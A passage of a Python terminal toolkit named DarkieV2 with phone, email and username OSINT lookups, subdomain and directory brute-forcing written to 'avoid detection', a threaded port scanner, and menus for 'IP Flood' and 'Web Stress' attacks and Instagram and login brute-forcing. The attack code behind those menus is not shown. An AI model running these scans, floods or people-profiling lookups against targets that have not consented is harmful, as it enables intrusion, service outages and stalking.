        lines.append(f"  Apps:   {c('Not found on WhatsApp/Telegram', Fore.YELLOW)}")
    if spam_count > 0:
        lines.append(f"  Spam:   {c(f'{spam_count} reports on Truecaller', Fore.RED)}")
    if numlookup_data.get("location"):
        lines.append(f"  Region: {c(numlookup_data['location'], Fore.CYAN)} (Numlookup)")

    if detected == "US/CA" and length == 11:
        npa = digits[1:4]; nxx = digits[4:7]; sub = digits[7:]
        city, state, tz = NPA_DB.get(npa, ("Unknown","Unknown","Unknown"))
        vzw = {"201","212","213","310","312","313","323","347","408","412","413","414","415","416","417","425","443","469","480","503","504","510","512","513","515","516","530","540","541","551","559","561","562","570","571","585","586","602","603","605","606","607","608","609","610","612","614","615","616","617","618","619","626","630","631","646","647","650","651","660","661","662","669","678","682","701","702","703","704","706","707","708","712","713","714","715","716","717","718","719","720","724","727","731","732","734","740","747","754","757","760","762","763","765","770","772","773","774","775","781","785","786","787","801","802","803","804","805","806","808","810","812","813","814","815","816","817","818","828","830","831","832","843","845","847","848","850","856","857","858","859","860","862","863","864","865","870","901","902","903","904","908","909","910","912","913","914","915","916","917","918","919","920","925","928","929","931","936","937","940","941","947","949","951","952","954","956","959","970","971","972","973","978","979","980","984","985"}
        carrier = "Verizon" if npa in vzw else "T-Mobile" if npa in {"917","646","347"} else "AT&T" if npa in {"214","469","682","713","726","737","817","830","832","903","915","940","956","972","979"} else "Regional"
        lt = "Toll-Free" if npa in TOLLFREE_PREFIXES else "VoIP" if nxx.startswith("2") else "Mobile"
        lines.append(f"  NPA-NXX: {c(f'{npa}-{nxx}-{sub}', Fore.MAGENTA)}")
        lines.append(f"  Location: {c(f'{city}, {state}', Fore.CYAN)} ({c(tz, Fore.YELLOW)})")
        lines.append(f"  Type: {c(lt, Fore.GREEN)}")
        lines.append(f"  Carrier: {c(carrier, Fore.CYAN)}")

    elif detected == "India" and length == 12:
        nat = digits[2:]; ndc = nat[:4]; sub = nat[4:]
        ndc_info = INDIAN_NDC.get(ndc)
        lines.append(f"  National: {c(nat, Fore.MAGENTA)}")
        lines.append(f"  NDC: {c(ndc, Fore.MAGENTA)}/{c(sub, Fore.MAGENTA)}")
        if ndc_info:
            ndc_city, ndc_state, ndc_circle = ndc_info
            lines.append(f"  Number Block: {c(ndc_circle, Fore.CYAN)}")
            lines.append(f"  (allocated to {c(ndc_city + ', ' + ndc_state, Fore.YELLOW)} — the SIM can be registered anywhere in India)")
        else:
            operator = _detect_indian_operator(ndc)
            lines.append(f"  Original Operator: {c(operator, Fore.CYAN)}")
        if truecaller_carrier:
            lines.append(f"  Current Carrier: {c(truecaller_carrier, Fore.GREEN)}")
        elif ndc_info:
            lines.append(f"  Current Carrier: {c('Unknown (MNP may have changed it)', Fore.YELLOW)}")
    else:
        lines.append(f"  Type: {c('Standard Number', Fore.GREEN)}")

    if google_snippet:
        lines.append(f"  Google Cache: {c(google_snippet[:150], Fore.BLUE)}")

    info_box("Phone Intelligence", lines, Fore.YELLOW)
    print()


def osint_email():
    header_box("Email OSINT", Fore.YELLOW)
    email = input(f"  {c(f'Email {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not email or '@' not in email: return
    local, domain = email.split('@', 1)
    print(f"\n  {c('Analyzing:', Fore.GREEN)} {email}")
    mx = []; domain_ip = ""
    try:
        answers = socket.getaddrinfo(domain, 25, socket.AF_INET, socket.SOCK_STREAM)
        mx = list(set(a[4][0] for a in answers[:3]))
    except: pass
    try: domain_ip = socket.gethostbyname(domain)
    except: pass
    spf = ""
    if shutil.which("dig"):
        try:
            r = subprocess.run(["dig", "+short", "TXT", domain], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "v=spf1" in line: spf = line.strip()[:60]; break
        except: pass
    gravatar = ""
    try:
        import hashlib
        h = hashlib.md5(email.encode()).hexdigest()
        gr = requests.get(f"https://www.gravatar.com/avatar/{h}", timeout=5)
        if gr.status_code == 200 and len(gr.content) > 100: gravatar = "Found"
    except: pass
    lines = [f"  Email: {c(email, Fore.GREEN)}", f"  Domain: {c(domain, Fore.CYAN)}", f"  IP: {c(domain_ip, Fore.MAGENTA) if domain_ip else c('N/A', Fore.RED)}"]
    lines.append(f"  MX: {c(', '.join(mx[:2]), Fore.YELLOW) if mx else c('None', Fore.RED)}")
    lines.append(f"  SPF: {c(spf, Fore.GREEN) if spf else c('Not set', Fore.YELLOW)}")
    lines.append(f"  Gravatar: {c(gravatar, Fore.GREEN) if gravatar else c('None', Fore.YELLOW)}")
    info_box("Email Intel", lines, Fore.YELLOW)
    print(f"  {c('Links:', Fore.CYAN)} https://haveibeenpwned.com/account/{email}")
    print()


def osint_ipgeo():
    header_box("IP Geolocation", Fore.YELLOW)
    target = input(f"  {c(f'IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    try: socket.inet_aton(target); ip = target
    except:
        try: ip = socket.gethostbyname(target); print(f"  {c(SYM_CHECK, Fore.GREEN)} {target} {SYM_ARROW} {ip}")
        except: print(f"  {RED}Could not resolve.{RESET}"); return
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting", timeout=10)
        d = r.json()
        if d.get("status") == "success":
            lines = [f"  IP: {c(ip, Fore.GREEN)}", f"  Location: {c(d.get('city','?'), Fore.MAGENTA)}, {c(d.get('regionName','?'), Fore.CYAN)} {c(d.get('zip','?'), Fore.GREEN)}", f"  Country: {c(d.get('country','?'), Fore.YELLOW)}", f"  ISP: {c(d.get('isp','?'), Fore.CYAN)}", f"  ASN: {c(d.get('as','?'), Fore.MAGENTA)}", f"  Lat/Lon: {c(str(d.get('lat','?')), Fore.GREEN)}, {c(str(d.get('lon','?')), Fore.CYAN)}", f"  TZ: {c(d.get('timezone','?'), Fore.YELLOW)}", f"  Proxy/VPN: {c(SYM_CHECK, Fore.RED) if d.get('proxy') or d.get('hosting') else c('No', Fore.GREEN)}"]
            info_box("Geolocation", lines, Fore.YELLOW)
            print(f"  {c('Map:', Fore.CYAN)} https://www.google.com/maps?q={d.get('lat','0')},{d.get('lon','0')}")
        else: print(f"  {RED}Lookup failed.{RESET}")
    except Exception as e: print(f"  {RED}Error: {e}{RESET}")
    print()


def osint_dns():
    header_box("DNS Enumeration", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain: return
    has_dig = shutil.which("dig")
    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
        records = []
        if has_dig:
            try:
                r = subprocess.run(["dig","+short",domain,rtype], capture_output=True, text=True, timeout=5)
                if r.stdout.strip(): records = [l.strip() for l in r.stdout.strip().splitlines() if l.strip()]
            except: pass
        else:
            try:
                if rtype == "A": records = [socket.gethostbyname(domain)]
            except: pass
        if records:
            print(f"  {c(f'{rtype:5s}:', Fore.CYAN)} {c(', '.join(records[:3]), Fore.GREEN)}")
    print()


def osint_subdomain():
    header_box("Subdomain Discovery", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain: return
    print(f"  {c(f'Brute-forcing ({len(SUBDOMAIN_WORDLIST)} words)...', Fore.CYAN)}")
    print(f"  {c('(rate-limited to 5 req/s to avoid detection)', Fore.YELLOW)}")
    found = []; total = len(SUBDOMAIN_WORDLIST)
    for i, sub in enumerate(SUBDOMAIN_WORDLIST):
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            found.append((fqdn, ip))
            print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(fqdn, Fore.CYAN)} {SYM_ARROW} {c(ip, Fore.GREEN)}")
        except: pass
        if i % 20 == 0: sys.stdout.write(f"\r  {c(f'{i}/{total}', Fore.CYAN)} Found: {c(len(found), Fore.GREEN)}  "); sys.stdout.flush()
        if i % 5 == 0: time.sleep(0.2)
    print(f"\n  {c(f'Found {len(found)} subdomains', Fore.GREEN)}\n")


def osint_social():
    header_box("Social Username Search", Fore.YELLOW)
    user = input(f"  {c(f'Username {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not user: return
    print(f"  {c(f'Checking {len(SOCIAL_PLATFORMS)} platforms...', Fore.CYAN)}")
    found = 0
    for platform, (tmpl, missing_indicator) in SOCIAL_PLATFORMS.items():
        url = tmpl.format(user)
        try:
            r = requests.get(url, timeout=6, headers={"User-Agent":"Mozilla/5.0 (compatible; DarkieV2)"}, allow_redirects=True)
            txt = r.text.lower()
            if missing_indicator.lower() in txt or r.status_code in (404, 410):
                continue
            if r.status_code == 200:
                found += 1
                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(platform+':', Fore.CYAN):16s} {c(url, Fore.GREEN)}")
        except: pass
        time.sleep(0.3)  # Rate limiting
    print(f"  {c(f'Found {found}/{len(SOCIAL_PLATFORMS)}', Fore.GREEN)}\n")


def osint_website():
    header_box("Website Tech Recon", Fore.YELLOW)
    url = input(f"  {c(f'URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "DarkieV2/1.0"})
        lines = [f"  URL: {c(r.url, Fore.GREEN)}", f"  Status: {c(str(r.status_code), Fore.YELLOW)}", f"  Size: {c(f'{len(r.content):,}B', Fore.MAGENTA)}"]
        for h, lbl in [("Server","Server"),("X-Powered-By","Powered"),("X-Frame-Options","XFO"),("Content-Security-Policy","CSP"),("Strict-Transport-Security","HSTS")]:
            if h in r.headers: lines.append(f"  {lbl:8s}: {c(r.headers[h][:40], Fore.GREEN)}")
        info_box("HTTP Recon", lines, Fore.YELLOW)
    except Exception as e: print(f"  {RED}Error: {e}{RESET}")
    print()


def osint_whois():
    header_box("Whois Lookup", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain: return
    if shutil.which("whois"):
        try:
            r = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=30)
            for line in r.stdout.splitlines():
                if any(line.lower().startswith(k) for k in ["domain name","registrar","creation date","expir","registrant","name server","dnssec","status"]):
                    print(f"  {c(line.strip(), Fore.GREEN)}")
        except: print(f"  {RED}Whois error.{RESET}")
    else: print(f"  {YELLOW}whois not installed.{RESET}")
    print()


# ── Telephone Tools ────────────────────────────────

def tel_analyze():
    header_box("Telephone Number Analysis", Fore.MAGENTA)
    num = input(f"  {c(f'Phone number {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not num: return
    cleaned = re.sub(r'[^\d+]', '', num)
    if not cleaned.startswith('+'): cleaned = '+' + cleaned
    lines = [f"  Number: {c(cleaned, Fore.GREEN)}"]
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code): lines.append(f"  Country: {c(country, Fore.YELLOW)}"); break
    info_box("Telephone Analysis", lines, Fore.MAGENTA); print()


def tel_country_codes():
    header_box("Country Codes", Fore.MAGENTA)
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: int(x[0])):
        print(f"    +{code:4s}  {c(country, Fore.GREEN)}")
    print()


def tel_format():
    header_box("Phone Formatter", Fore.MAGENTA)
    num = input(f"  {c(f'Number {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not num: return
    d = re.sub(r'[^\d]', '', num)
    print(f"  {c('Formats:', Fore.CYAN)}")
    print(f"    Raw: {c(d, Fore.GREEN)}")
    print(f"    International: {c('+'+d, Fore.GREEN)}")
    if len(d) == 11 and d.startswith('1'): print(f"    US: {c(f'+1 ({d[1:4]}) {d[4:7]}-{d[7:]}', Fore.GREEN)}")
    print()


# ── Legacy Network Utilities ───────────────────────

def legacy_portscan():
    header_box("TCP Port Scanner", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    try: socket.inet_aton(target); ip = target
    except:
        try: ip = socket.gethostbyname(target); print(f"  {c(SYM_CHECK, Fore.GREEN)} {target} {SYM_ARROW} {ip}")
        except: print(f"  {RED}Could not resolve.{RESET}"); return
    print(f"  {c('[1]', Fore.GREEN)} Top 30  [2] Top 1000  [3] Custom")
    ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if ch == "2": ports = list(range(1, 1025))
    elif ch == "3":
        try: r_in = input(f"  {c(f'Range (e.g. 1-1000) {SYM_PROMPT} ', Fore.CYAN)}").strip(); parts = r_in.split("-"); ports = list(range(int(parts[0]), int(parts[1])+1))
        except: ports = [22,80,443,8080,8443,3306,5432,6379,27017]
    else: ports = [22,21,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,9090,9200,27017]
    open_ports = []; total = len(ports)
    def chk(p, r, i):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1.5)
        r[i] = p if s.connect_ex((ip, p)) == 0 else None; s.close()
    for i in range(0, total, 50):
        batch = ports[i:i+50]; br = {}
        with ThreadPoolExecutor(max_workers=100) as ex:
            fs = {ex.submit(chk, p, br, j): j for j, p in enumerate(batch)}
            for f in as_completed(fs): f.result()
        for idx in br:
            if br[idx] is not None: open_ports.append(br[idx])
        sys.stdout.write(f"\r  {c(f'{min(i+50, total)}/{total}', Fore.CYAN)}  Open: {c(len(open_ports), Fore.GREEN)}  "); sys.stdout.flush()
    print(f"\n  {c(SYM_CHECK + f' {len(open_ports)}/{total} open', Fore.GREEN)}")
    for p in sorted(open_ports):
        try: svc = socket.getservbyport(p)
        except: svc = "?"
        print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(f'{p:5d}', Fore.GREEN)} ({c(svc, Fore.CYAN)})")
    print()


def legacy_sslcheck():
    header_box("SSL/TLS Checker", Fore.BLUE)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain: return
    p_in = input(f"  {c(f'Port (443) {SYM_PROMPT} ', Fore.CYAN)}").strip(); port = int(p_in) if p_in.isdigit() else 443
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ss:
                cert = ss.getpeercert()
        if cert:
            subj = dict(x[0] for x in cert.get("subject",[]))
            iss = dict(x[0] for x in cert.get("issuer",[]))
            na = cert.get("notAfter","")
            lines = [f"  Subject: {c(subj.get('commonName','?'), Fore.GREEN)}", f"  Issuer: {c(iss.get('organizationName','?'), Fore.YELLOW)}", f"  Valid until: {c(na, Fore.MAGENTA)}"]
            try:
                exp = dt.strptime(na, "%b %d %H:%M:%S %Y %Z"); days = (exp - dt.now()).days
                lines.append(f"  Days left: {c(str(days), Fore.RED if days < 30 else Fore.GREEN)}")
            except: pass
            san = cert.get("subjectAltName",[])
            if san: lines.append(f"  SANs: {c(', '.join(v for k,v in san if k=='DNS')[:3], Fore.CYAN)}")
            info_box("SSL Certificate", lines, Fore.BLUE)
        else: print(f"  {RED}No cert.{RESET}")
    except Exception as e: print(f"  {RED}Error: {e}{RESET}")
    print()


def legacy_httpheaders():
    header_box("HTTP Security Headers", Fore.BLUE)
    url = input(f"  {c(f'URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "DarkieV2/1.0"})
        lines = [f"  URL: {c(r.url, Fore.GREEN)}", f"  Status: {c(str(r.status_code), Fore.YELLOW)}"]
        sec_h = {"Strict-Transport-Security":"HSTS","Content-Security-Policy":"CSP","X-Frame-Options":"XFO","X-Content-Type-Options":"XCTO","X-XSS-Protection":"XXSS","Referrer-Policy":"Referrer","Permissions-Policy":"Permissions"}
        for h, lbl in sec_h.items():
            if h in r.headers: lines.append(f"  {lbl:10s}: {c(r.headers[h][:45], Fore.GREEN)}")
            else: lines.append(f"  {lbl:10s}: {c('Not set', Fore.RED)}")
        info_box("Security Headers", lines, Fore.BLUE)
        present = sum(1 for h in sec_h if h in r.headers); pct = present / len(sec_h) * 100
        grade = c(f"Grade: {'A' if pct>=70 else 'C' if pct>=40 else 'F'} ({pct:.0f}%)", Fore.GREEN if pct>=70 else Fore.YELLOW if pct>=40 else Fore.RED)
        print(f"  {c('Rating:', Fore.CYAN)} {grade}")
    except Exception as e: print(f"  {RED}Error: {e}{RESET}")
    print()


def legacy_ping():
    header_box("Ping", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    c_in = input(f"  {c(f'Count (4) {SYM_PROMPT} ', Fore.CYAN)}").strip(); cnt = int(c_in) if c_in.isdigit() else 4
    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        r = subprocess.run(["ping", param, str(cnt), target], capture_output=True, text=True, timeout=30)
        for line in (r.stdout or r.stderr).splitlines():
            if any(x in line.lower() for x in ["round-trip","rtt","min/avg/max","packets","transmitted","received","loss","ttl=","time="]):
                print(f"  {c(line, Fore.GREEN)}")
        if r.returncode == 0: print(f"\n  {c(SYM_CHECK + ' Host alive', Fore.GREEN)}")
        else: print(f"\n  {c(SYM_X + ' Host unreachable', Fore.RED)}")
    except Exception as e: print(f"  {RED}Error: {e}{RESET}")
    print()


def legacy_traceroute():
    header_box("Traceroute", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    cmd = ["tracert", "-d", "-h", "20"] if platform.system().lower() == "windows" else ["traceroute", "-n", "-m", "20"]
    cmd.append(target)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        for line in (r.stdout or r.stderr).splitlines()[:25]:
            if line.strip(): print(f"  {Fore.GREEN}{line}{Style.RESET_ALL}")
    except: print(f"  {YELLOW}traceroute not available.{RESET}")
    print()


def legacy_web_recon():
    header_box("Web Recon (Dir Brute + Ports)", Fore.YELLOW)
    target = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not target: return
    if not target.startswith("http"): target = "https://" + target
    base = target.rstrip('/')
    parsed = urlparse(base); domain = parsed.netloc or parsed.path

    # Port scan
    print(f"\n  {c('Phase 1: Port Scan', Fore.MAGENTA)}")
    open_ports = []
    if shutil.which("nmap"):
        try:
            r = subprocess.run(["nmap","-T4","-F","--open",domain], capture_output=True, text=True, timeout=120)
            for line in r.stdout.splitlines():
                m = re.match(r'^(\d+)/tcp\s+open', line)
                if m:
                    p = int(m.group(1))
                    try: svc = socket.getservbyport(p)
                    except: svc = "?"
                    open_ports.append((p, svc))
                    print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(f'{p}', Fore.GREEN)} ({c(svc, Fore.CYAN)})")
        except: pass
    for p, sn in [(80,"http"),(443,"https"),(8080,"http-proxy"),(8443,"https-alt")]:
        if not any(op[0] == p for op in open_ports):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
                if s.connect_ex((domain, p)) == 0: open_ports.append((p, sn))
                s.close()
            except: pass

    # Dir brute-force
    print(f"\n  {c('Phase 2: Dir Brute-Force', Fore.MAGENTA)}")
    found = []
    for i, path in enumerate(WEB_PATH_WORDLIST):
        url = f"{base}/{path}"
        try:
            r = requests.get(url, timeout=4, headers={"User-Agent":"DarkieV2/1.0"}, allow_redirects=False)
            if r.status_code in (200,301,302,403,401):
                found.append((path, r.status_code, len(r.content)))
                print(f"    {c(f'[{r.status_code}]', Fore.GREEN if r.status_code==200 else Fore.YELLOW)} {c(url, Fore.GREEN)}")
        except: pass
        if i % 20 == 0: sys.stdout.write(f"\r    {c(f'{i}/{len(WEB_PATH_WORDLIST)}', Fore.CYAN)} Found: {c(len(found), Fore.GREEN)}  "); sys.stdout.flush()

    print(f"\n\n  {c('Results:', Fore.GREEN)} Ports: {len(open_ports)}, Paths: {len(found)}")
    print()


# ── Legacy Menu Functions ─────────────────────────

def menu_stress():
    while True:
        header_box("Stress Testing", Fore.RED)
        print(f"  {c('[1]', Fore.GREEN)}  Minecraft Stress")
        print(f"  {c('[2]', Fore.GREEN)}  Web Stress")
        print(f"  {c('[3]', Fore.GREEN)}  IP Flood")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1": stress_minecraft, "2": stress_web, "3": stress_ip}.get(ch, lambda: None)()
            if ch not in ("1","2","3"): print(f"  {RED}Invalid.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_osint():
    while True:
        header_box("OSINT Tools", Fore.YELLOW)
        print(f"  {c('[1]', Fore.GREEN)}  Phone Lookup")
        print(f"  {c('[2]', Fore.GREEN)}  Email Lookup")
        print(f"  {c('[3]', Fore.GREEN)}  IP Geolocation")
        print(f"  {c('[4]', Fore.GREEN)}  DNS Enumeration")
        print(f"  {c('[5]', Fore.GREEN)}  Subdomain Discovery")
        print(f"  {c('[6]', Fore.GREEN)}  Social Username Search")
        print(f"  {c('[7]', Fore.GREEN)}  Website Tech Recon")
        print(f"  {c('[8]', Fore.GREEN)}  Whois Lookup")
        print(f"  {c('[9]', Fore.GREEN)}  Web Recon (Dir Brute)")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            ac = {"1": osint_phone, "2": osint_email, "3": osint_ipgeo, "4": osint_dns,
                  "5": osint_subdomain, "6": osint_social, "7": osint_website, "8": osint_whois, "9": legacy_web_recon}
            if ch in ac: ac[ch]()
            else: print(f"  {RED}Invalid.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_telephone():
    while True:
        header_box("Telephone Tools", Fore.MAGENTA)
        print(f"  {c('[1]', Fore.GREEN)}  Analyze Number")
        print(f"  {c('[2]', Fore.GREEN)}  Country Codes")
        print(f"  {c('[3]', Fore.GREEN)}  Format Number")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1": tel_analyze, "2": tel_country_codes, "3": tel_format}.get(ch, lambda: None)()
            if ch not in ("1","2","3"): print(f"  {RED}Invalid.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_netutils():
    while True:
        header_box("Network Utilities", Fore.BLUE)
        print(f"  {c('[1]', Fore.GREEN)}  Port Scanner")
        print(f"  {c('[2]', Fore.GREEN)}  SSL/TLS Checker")
        print(f"  {c('[3]', Fore.GREEN)}  HTTP Security Headers")
        print(f"  {c('[4]', Fore.GREEN)}  Ping")
        print(f"  {c('[5]', Fore.GREEN)}  Traceroute")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            ac = {"1": legacy_portscan, "2": legacy_sslcheck, "3": legacy_httpheaders, "4": legacy_ping, "5": legacy_traceroute}
            if ch in ac: ac[ch]()
            else: print(f"  {RED}Invalid.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


# ──────────────────────────────────────────────────────────
#  MENU SYSTEM (v2)
# ──────────────────────────────────────────────────────────

def menu_network_threat():
    while True:
        header_box("Network & Threat Monitoring", Fore.RED)
        print(f"  {c('[1]', Fore.GREEN)}  Packet Capture & Analysis")
        print(f"  {c('[2]', Fore.GREEN)}  Real-time Traffic Monitor")
        print(f"  {c('[3]', Fore.GREEN)}  IDS Signature Detection")
        print(f"  {c('[4]', Fore.GREEN)}  ARP Spoofing Detector")
        print(f"  {c('[5]', Fore.GREEN)}  Port Scan Detector")
        print(f"  {c('[6]', Fore.GREEN)}  DDoS Detection")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()
        try:
            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "b": break
            actions = {"1": net_capture, "2": net_traffic_monitor, "3": net_ids,
                       "4": net_arp_detect, "5": net_portscan_detect, "6": net_ddos_detect}
            if choice in actions: actions[choice]()
            else: print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_endpoint():
    while True:
        header_box("Endpoint Security", Fore.MAGENTA)
        print(f"  {c('[1]', Fore.GREEN)}  Process Monitor")
        print(f"  {c('[2]', Fore.GREEN)}  Suspicious Process Detector")
        print(f"  {c('[3]', Fore.GREEN)}  File Integrity Checker")
        print(f"  {c('[4]', Fore.GREEN)}  Network Connection Monitor")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()
        try:
            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "b": break
            actions = {"1": ep_process_monitor, "2": ep_suspicious_processes,
                       "3": ep_file_integrity, "4": ep_network_connections}
            if choice in actions: actions[choice]()
            else: print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_vuln():
    while True:
        header_box("Vulnerability Management", Fore.BLUE)
        print(f"  {c('[1]', Fore.GREEN)}  Advanced Port Scanner")
        print(f"  {c('[2]', Fore.GREEN)}  CVE Lookup")
        print(f"  {c('[3]', Fore.GREEN)}  Vulnerability Assessment")
        print(f"  {c('[4]', Fore.GREEN)}  Security Config Checker")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()
        try:
            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "b": break
            actions = {"1": vuln_advanced_scan, "2": vuln_cve_lookup,
                       "3": vuln_assessment, "4": vuln_config_check}
            if choice in actions: actions[choice]()
            else: print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_data():
    while True:
        header_box("Data & Access Protection", Fore.YELLOW)
        print(f"  {c('[1]', Fore.GREEN)}  File Encryption / Decryption")
        print(f"  {c('[2]', Fore.GREEN)}  Password Strength Analyzer")
        print(f"  {c('[3]', Fore.GREEN)}  Brute-Force Detection")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()
        try:
            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "b": break
            actions = {"1": data_encrypt, "2": data_password_strength, "3": data_bruteforce_detect}
            if choice in actions: actions[choice]()
            else: print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_pentest():
    while True:
        header_box("Ethical Hacking & Pentest", Fore.GREEN)
        print(f"  {c('[1]', Fore.GREEN)}  SQL Injection Detector")
        print(f"  {c('[2]', Fore.GREEN)}  XSS Scanner")
        print(f"  {c('[3]', Fore.GREEN)}  Path Traversal Tester")
        print(f"  {c('[4]', Fore.GREEN)}  Subdomain Takeover Checker")
        print(f"  {c('[5]', Fore.GREEN)}  HTTP Methods Fuzzer")
        print(f"  {c('[6]', Fore.GREEN)}  Brute-Force Login Tester")
        print(f"  {c('[7]', Fore.MAGENTA)}  Instagram OSINT & Auth Tester")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()
        try:
            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "b": break
            actions = {"1": pentest_sqli, "2": pentest_xss, "3": pentest_path_traversal,
                       "4": pentest_subdomain_takeover, "5": pentest_http_methods, "6": pentest_bruteforce_login, "7": pentest_instagram}
            if choice in actions: actions[choice]()
            else: print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def menu_siem():
    while True:
        header_box("SIEM & Log Analysis", Fore.CYAN)
        print(f"  {c('[1]', Fore.GREEN)}  Log File Analyzer")
        print(f"  {c('[2]', Fore.GREEN)}  Real-time Log Monitor")
        print(f"  {c('[3]', Fore.GREEN)}  Alert Dashboard ({c(len(LOG_ALERTS), Fore.YELLOW)} alerts)")
        print(f"  {c('[4]', Fore.GREEN)}  Threat Pattern Detection")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()
        try:
            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "b": break
            actions = {"1": siem_log_analyzer, "2": siem_realtime_monitor,
                       "3": siem_alert_viewer, "4": siem_threat_patterns}
            if choice in actions: actions[choice]()
            else: print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


# ──────────────────────────────────────────────────────────
#  MODULE: MINEFLAYER BOT SUPPORT
# ──────────────────────────────────────────────────────────

def _ensure_mineflayer():
    tool_dir = os.path.dirname(os.path.abspath(__file__))
    nm_dir = os.path.join(tool_dir, "node_modules", "mineflayer")
    if not os.path.isdir(nm_dir):
        alt_dir = os.path.join(os.path.dirname(tool_dir), "v2", "node_modules", "mineflayer")
        if os.path.isdir(alt_dir):
            return
